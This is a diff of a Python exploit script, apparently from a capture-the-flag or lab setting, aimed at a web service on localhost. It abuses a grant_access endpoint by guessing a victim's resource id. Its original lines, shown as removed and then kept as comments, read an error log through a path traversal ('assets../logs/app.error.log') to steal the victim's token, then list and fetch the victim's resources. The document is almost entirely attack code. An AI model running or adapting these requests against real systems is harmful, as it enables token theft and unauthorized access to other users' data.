@@ -37,7 +37,7 @@ def fill_user_data():
     print(r)
     print(r.json())
     token0 = r.json()['token']
-    print('victim token: ', token0)
+    print('victim token0: ', token0)
 
     url = 'http://localhost:8080/issue_token'
     r = requests.post(url, json={}, cookies=cookies)
@@ -45,7 +45,7 @@ def fill_user_data():
     print(r.json())
     token1 = r.json()['token']
 
-    for _ in range(3):
+    for _ in range(1):
         url = 'http://localhost:8080/create_resource'
         data = {
             'name': 'name',
@@ -67,16 +67,6 @@ def main():
     r = requests.post(url, json=data)
     cookies = r.cookies
 
-    url = 'http://localhost:8080/grant_access'
-    data = {
-        'username': victim_username,
-        'token': 'token0',
-        'resource_id': 'ne-res',
-    }
-    r = requests.post(url, json=data, cookies=cookies)
-    print(r)
-    print(r.json())
-
     url = 'http://localhost:8080/issue_token'
     r = requests.post(url, json={}, cookies=cookies)
     print(r)
@@ -96,6 +86,17 @@ def main():
 
     victim_resource_id = str(int(resource_id) - 1)
     print('resource_id', resource_id)
+
+
+    url = 'http://localhost:8080/grant_access'
+    data = {
+        'username': victim_username,
+        'token': 'token0',
+        'resource_id': victim_resource_id,
+    }
+    r = requests.post(url, json=data, cookies=cookies)
+    print(r)
+    print(r.json())
 
     # return
     url = 'http://localhost:8080/remove_resource'
@@ -120,27 +121,27 @@ def main():
     except Exception:
         pass
 
-    url = 'http://localhost:8080/assets../logs/app.error.log'
-    r = requests.get(url, json={}, cookies=cookies)
-    print(r)
-    victim_token = r.text.split()[-1].strip("'")
-
-    # return
-    url = 'http://localhost:8080/list_resources_by_token?username={}&token={}'.format(victim_username, victim_token)
-    r = requests.get(url)
-    print(r)
-    print(r.content)
-    print(r.json())
-
-    for victim_resource in r.json()['resources']:
-        try:
-            victim_resource_id = victim_resource['id']
-            url = 'http://localhost:8080/get_resource?username={}&token={}&resource_id={}'.format(victim_username, victim_token, victim_resource_id)
-            r = requests.get(url)
-            print(r)
-            print(r.json())
-        except Exception:
-            pass
+    # url = 'http://localhost:8080/assets../logs/app.error.log'
+    # r = requests.get(url, json={}, cookies=cookies)
+    # print(r)
+    # victim_token = r.text.split()[-1].strip("'")
+    #
+    # # return
+    # url = 'http://localhost:8080/list_resources_by_token?username={}&token0={}'.format(victim_username, victim_token)
+    # r = requests.get(url)
+    # print(r)
+    # print(r.content)
+    # print(r.json())
+    #
+    # for victim_resource in r.json()['resources']:
+    #     try:
+    #         victim_resource_id = victim_resource['id']
+    #         url = 'http://localhost:8080/get_resource?username={}&token0={}&resource_id={}'.format(victim_username, victim_token, victim_resource_id)
+    #         r = requests.get(url)
+    #         print(r)
+    #         print(r.json())
+    #     except Exception:
+    #         pass
 
 
 if __name__ == '__main__':
